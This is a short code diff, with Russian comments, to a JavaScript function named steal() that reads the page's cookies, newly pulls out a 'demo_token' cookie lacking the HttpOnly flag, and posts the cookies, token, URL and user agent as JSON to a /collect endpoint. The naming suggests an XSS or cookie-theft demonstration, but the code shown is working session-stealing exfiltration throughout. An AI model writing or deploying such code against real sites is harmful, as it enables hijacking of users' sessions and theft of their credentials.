@@ -95,8 +95,14 @@ async function steal() {
     await new Promise(r => setTimeout(r, 600));
   }
 
-  // читаем все cookies
+  // читаем все cookies (JS видит только без HttpOnly)
   const cookies = document.cookie;
+
+  // извлекаем demo_token — уязвимый cookie без HttpOnly флага
+  const demoToken = cookies.split(';')
+    .map(c => c.trim())
+    .find(c => c.startsWith('demo_token='))
+    ?.split('=')[1] || null;
 
   // отправляем на /collect
   try {
@@ -105,6 +111,7 @@ async function steal() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         cookies:    cookies,
+        token:      demoToken,
         url:        window.location.href,
         useragent:  navigator.userAgent,
         timestamp:  new Date().toISOString(),
